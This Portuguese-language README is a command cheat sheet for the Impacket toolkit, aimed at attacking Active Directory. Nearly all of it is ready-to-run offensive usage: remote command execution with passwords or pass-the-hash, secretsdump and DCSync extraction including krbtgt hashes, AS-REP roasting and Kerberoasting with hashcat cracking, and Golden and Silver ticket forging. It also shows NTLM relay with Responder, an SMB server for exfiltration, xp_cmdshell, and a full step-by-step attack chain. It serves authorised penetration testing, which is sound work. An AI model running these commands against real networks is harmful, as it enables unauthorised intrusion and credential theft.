# 🐍 Impacket — ferramentas Python para ataques a AD

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de precisão e versão:** os executáveis com prefixo impacket- e os scripts .py podem depender do pacote instalado; confirme a ajuda da versão escolhida. No exemplo psexec descrito como seleção de partilha, `-target-ip` indica o endereço IP do alvo, não uma partilha. DCSync extrai material de credenciais por replicação e não deve ser confundido com uma cópia integral de todos os dados do diretório. As classificações de menor visibilidade são relativas. [Projeto Impacket](https://github.com/fortra/impacket) e [opções psexec oficiais](https://github.com/fortra/impacket/blob/master/examples/psexec.py). TGT é um ticket que permite pedir tickets de serviço; ccache é uma cache de credenciais Kerberos.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Ferramentas Python para protocolos de rede
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Índice

- [O que é o Impacket](#-what-is-impacket)
- [Instalação](#-installation)
- [Execução remota](#-remote-execution)
- [Extração de credenciais](#-credential-dumping)
- [Ataques a Kerberos](#-kerberos-attacks)
- [Ataques a SMB](#-smb-attacks)
- [Ataques a MSSQL](#-mssql-attacks)
- [Consultas LDAP/AD](#-ldapad-queries)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-impacket"></a>
## 🎯 O que é o Impacket

O **Impacket** é um conjunto de classes Python para trabalhar com protocolos de rede, muito utilizado em ataques a AD:

- 🎫 **Kerberos** — AS-REP roasting, Kerberoasting e ataques com tickets
- 💻 **Execução remota** — psexec, wmiexec, smbexec e atexec
- 🔓 **Extração de credenciais** — secretsdump e DCSync
- 📁 **SMB** — Operações com ficheiros e reencaminhamento de autenticação
- 🗄️ **MSSQL** — Ataques a bases de dados

### Ferramentas principais

| Ferramenta | Descrição |
|------|-------------|
| **psexec.py** | Execução remota através de SMB |
| **wmiexec.py** | Execução remota através de WMI |
| **secretsdump.py** | Extrair credenciais e hashes |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | Ataques de reencaminhamento NTLM |
| **smbclient.py** | Cliente SMB |
| **mssqlclient.py** | Cliente MSSQL |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux

```bash
# Pré-instalado no Kali
impacket-psexec --help

# Ou instalar/atualizar
pip3 install impacket
pip3 install impacket --upgrade
```

### A partir de GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Ou instalar em modo de desenvolvimento
pip3 install -e .
```

### Verificar

```bash
# Verificar a instalação
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

<a id="-remote-execution"></a>
## 💻 Execução remota

### psexec.py

```bash
# Com palavra-passe
impacket-psexec domain.local/user:password@10.10.10.10

# Com hash NTLM (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Administrador local
impacket-psexec administrator:password@10.10.10.10

# Executar um comando
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Escolher uma partilha específica
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Menos visível do que psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# Com hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Executar um comando
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Sem saída (silencioso)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Utiliza SMB para execução
impacket-smbexec domain.local/user:password@10.10.10.10

# Com hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Indicar a partilha
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Utiliza o Agendador de Tarefas
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Com hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Utiliza DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Objetos DCOM diferentes
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

<a id="-credential-dumping"></a>
## 🔓 Extração de credenciais

### secretsdump.py

```bash
# Extrair a partir de um sistema remoto
impacket-secretsdump domain.local/user:password@10.10.10.10

# Extrair com hash (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Extrair a partir de um controlador de domínio (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync apenas de um utilizador específico
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Apenas hashes NTLM (sem chaves Kerberos)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Guardar a saída num ficheiro
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### Ataque DCSync

```bash
# DCSync completo (extrai toda a base de dados AD)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync de um utilizador específico
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync de krbtgt (para Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Formato de saída: user:RID:LM:NTLM:::
```

### A partir de ficheiros locais

```bash
# A partir de NTDS.dit e SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# A partir de SAM e SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# A partir de SECURITY e SYSTEM (segredos LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

<a id="-kerberos-attacks"></a>
## 🎫 Ataques a Kerberos

### AS-REP Roasting (GetNPUsers.py)

```bash
# Encontrar utilizadores sem pré-autenticação
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Com credenciais
impacket-GetNPUsers domain.local/user:password -request

# Com o endereço IP do controlador de domínio indicado
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Guardar a saída num ficheiro
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Formato para hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Formato para John
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Encontrar utilizadores suscetíveis a Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Pedir tickets TGS
impacket-GetUserSPNs domain.local/user:password -request

# Guardar a saída num ficheiro
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# Endereço IP do controlador de domínio
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Com hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Descobrir palavras-passe a partir de hashes Kerberos

```bash
# AS-REP (modo 18200 do hashcat)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (modo 13100 do hashcat)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Com John
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Pedir um TGT com palavra-passe
impacket-getTGT domain.local/user:password

# Pedir um TGT com hash
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Pedir um TGT com chave AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Guarda em user.ccache
# Exportar para utilização:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Utilizar o ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

<a id="-smb-attacks"></a>
## 📁 Ataques a SMB

### smbclient.py

```bash
# Ligar à partilha
impacket-smbclient domain.local/user:password@10.10.10.10

# Listar partilhas
# (dentro de smbclient)
shares

# Ligar a uma partilha específica
use SHARE_NAME

# Listar ficheiros
ls

# Descarregar um ficheiro
get filename

# Enviar um ficheiro
put localfile

# Executar um comando
# (se tiver acesso de escrita a uma partilha)
```

### smbserver.py

```bash
# Iniciar um servidor SMB (para exfiltração)
impacket-smbserver share /tmp/share

# Com autenticação
impacket-smbserver share /tmp/share -username user -password pass

# Suporte de SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Reencaminhamento básico
impacket-ntlmrelayx -tf targets.txt

# Reencaminhar para SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Reencaminhar a autenticação e executar um comando
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Extrair SAM após o reencaminhamento
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Reencaminhamento para LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Com Responder:
# 1. Editar Responder.conf e definir SMB = Off, HTTP = Off
# 2. Executar: responder -I eth0
# 3. Executar: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-mssql-attacks"></a>
## 🗄️ Ataques a MSSQL

### mssqlclient.py

```bash
# Ligar com autenticação Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Ligar com autenticação SQL
impacket-mssqlclient sa:password@10.10.10.10

# Com hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Ligar a uma base de dados específica
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### Comandos MSSQL

```sql
-- Ativar xp_cmdshell
enable_xp_cmdshell

-- Executar um comando
xp_cmdshell whoami

-- Consulta SQL
SELECT * FROM master.sys.databases

-- Ler ficheiro
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

<a id="-ldapad-queries"></a>
## 📂 Consultas LDAP/AD

### GetADUsers.py

```bash
# Listar todos os utilizadores
impacket-GetADUsers domain.local/user:password -all

# Controlador de domínio específico
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Com hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Enumerar utilizadores por força bruta de SIDs
impacket-lookupsid domain.local/user:password@10.10.10.10

# Indicar o intervalo de SIDs
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Encontrar definições de delegação
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Opções de autenticação

| Opção | Descrição |
|--------|-------------|
| `user:password` | Autenticação por palavra-passe |
| `-hashes :NTLM` | Hash NTLM (Pass-the-Hash) |
| `-hashes LM:NTLM` | Hash LM:NTLM |
| `-aesKey KEY` | Chave AES256 |
| `-k -no-pass` | Kerberos com cache de tickets ccache |

### Opções comuns

| Opção | Descrição |
|--------|-------------|
| `-dc-ip IP` | Endereço IP do controlador de domínio |
| `-target-ip IP` | Endereço IP do alvo |
| `-debug` | Ativar a saída de depuração |

### Resumo dos métodos de execução remota

| Ferramenta | Método | Menor visibilidade |
|------|--------|---------|
| psexec.py | SMB e serviço | Baixa |
| wmiexec.py | WMI | Média |
| smbexec.py | SMB | Baixa |
| atexec.py | Agendador de Tarefas | Elevada |
| dcomexec.py | DCOM | Média |

### Fluxo de ataque

```bash
# 1. Enumerar utilizadores (AS-REP roasting)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Executar Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Descobrir palavras-passe a partir dos hashes
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Utilizar PtH ou a palavra-passe
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Extrair credenciais
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync para obter todos os hashes
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Recursos

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Guias de referência relacionados
- [BloodHound](../../BloodHound/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)
- [Hashcat](../../Hashcat/translations/README.pt.md)

---

<p align="center">
  <b>🐍 Domine os ataques a AD com Python!</b><br>
  <i>Impacket — ferramentas essenciais para testes de intrusão</i>
</p>
